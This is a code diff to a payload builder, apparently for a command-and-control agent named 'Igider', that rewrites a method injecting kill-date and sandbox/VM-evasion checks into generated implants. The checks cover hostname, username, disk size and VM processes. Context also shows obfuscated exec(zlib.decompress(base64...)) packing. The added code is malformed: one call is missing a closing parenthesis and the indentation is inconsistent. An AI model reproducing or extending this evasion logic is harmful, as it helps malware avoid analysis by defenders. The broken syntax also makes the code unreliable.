@@ -233,64 +233,175 @@ exec(zlib.decompress(base64.b64decode({compressed_b64})))
         return code
 
     def _add_evasion_features(self, code: str) -> str:
-        """Add anti-analysis and VM detection capabilities."""
-        # Add kill date check if specified*******************************************
+        """Add anti-analysis and VM detection capabilities with robust error handling."""
+        evasion_code = []
+         # 1. Add kill date check if specified
         try:
-            kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)
-
-        except (IndexError, AttributeError, TypeError) as e:
-            kill_date = None
-            self.logger.warning(f"Could not retrieve kill_date: {e}")
-
-        evasion_code = ""
-        
-        if kill_date and kill_date.strip():
-            evasion_code += f"""
+            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
+            if kill_date:
+                try:
+                    # Validate date format
+                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
+                    evasion_code.append(f"""
 import datetime
 if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
     import sys
     sys.exit(0)
-"""
-        
-        # Add basic sandbox/VM detection
-        evasion_code += """
+""")
+                except ValueError as e:
+                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
+        except (IndexError, AttributeError, TypeError) as e:
+            self.logger.debug(f"Could not retrieve kill_date: {e}")
+
+    # 2. Add platform-agnostic evasion checks
+        evasion_code.append("""
 def check_environment():
     import os
+    import sys
     import socket
     import platform
+    import subprocess
     
-    # Check for common analysis hostnames
-    hostname = socket.gethostname().lower()
-    suspicious_names = ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual']
-    for name in suspicious_names:
-        if name in hostname:
-            return False
+    # Generic suspicious indicators
+    suspicious_indicators = {
+        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
+        'users': ['user', 'sandbox', 'vmuser'],
+        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
+    }
     
-    # Check for small disk size (common in VMs)
+    # Check hostname
     try:
-        if os.name == 'nt':
-            import ctypes
-            free_bytes = ctypes.c_ulonglong(0)
-            ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
-            if free_bytes.value < 21474836480:  # 20 GB
-                return False
-        else:
-            import shutil
-            if shutil.disk_usage("/").free < 21474836480:  # 20 GB
-                return False
+        hostname = socket.gethostname().lower()
+        if any(name in hostname for name in suspicious_indicators['hostnames']):
+            return False
     except:
+        pass
+    
+    # Check username
+    try:
+        username = os.getenv("USER", "").lower()
+        if any(user in username for user in suspicious_indicators['users']):
+            return False
+    except:
+        pass
+    
+    # Platform-specific checks
+    try:
+        if platform.system().lower() == 'windows':
+            import ctypes
+            # Check disk size (Windows)
+            try:
+                free_bytes = ctypes.c_ulonglong(0)
+                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
+                    ctypes.c_wchar_p(r"C:\\"), 
+                    None, 
+                    None, 
+                    ctypes.pointer(free_bytes)
+                if free_bytes.value < 21474836480:  # 20 GB
+                    return False
+            except:
+                pass
+            
+            # Check for common VM processes (Windows)
+            try:
+                import wmi
+                c = wmi.WMI()
+                for process in c.Win32_Process():
+                    if process.Name.lower() in suspicious_indicators['processes']:
+                        return False
+            except:
+                pass
+                
+        else:  # Linux/Mac
+            import shutil
+            # Check disk size
+            try:
+                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
+                    return False
+            except:
+                pass
+            
+            # Check for VM-specific processes (Linux/Mac)
+            try:
+                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
+                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
+                if output:
+                    return False
+            except:
+                pass
+                
+    except Exception as e:
+        # If any checks fail, assume we're in a good environment
         pass
     
     return True
 
-# Exit if suspicious environment detected
+# Execute evasion checks
 if not check_environment():
     import sys
     sys.exit(0)
-"""
+""")
+    
+    # Combine all evasion code and prepend to the original code
+        return "\n".join(evasion_code) + "\n" + code
+#         """Add anti-analysis and VM detection capabilities."""
+#         # Add kill date check if specified*******************************************
+#         try:
+#             kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)
+
+#         except (IndexError, AttributeError, TypeError) as e:
+#             kill_date = None
+#             self.logger.warning(f"Could not retrieve kill_date: {e}")
+
+#         evasion_code = ""
         
-        # Add the evasion code at the beginning of the agent code
-        return evasion_code + code
+#         if kill_date and kill_date.strip():
+#             evasion_code += f"""
+# import datetime
+# if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
+#     import sys
+#     sys.exit(0)
+# """
+        
+#         # Add basic sandbox/VM detection
+#         evasion_code += """
+# def check_environment():
+#     import os
+#     import socket
+#     import platform
+    
+#     # Check for common analysis hostnames
+#     hostname = socket.gethostname().lower()
+#     suspicious_names = ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual']
+#     for name in suspicious_names:
+#         if name in hostname:
+#             return False
+    
+#     # Check for small disk size (common in VMs)
+#     try:
+#         if os.name == 'nt':
+#             import ctypes
+#             free_bytes = ctypes.c_ulonglong(0)
+#             ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
+#             if free_bytes.value < 21474836480:  # 20 GB
+#                 return False
+#         else:
+#             import shutil
+#             if shutil.disk_usage("/").free < 21474836480:  # 20 GB
+#                 return False
+#     except:
+#         pass
+    
+#     return True
+
+# # Exit if suspicious environment detected
+# if not check_environment():
+#     import sys
+#     sys.exit(0)
+# """
+        
+#         # Add the evasion code at the beginning of the agent code
+#         return evasion_code + code
 
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
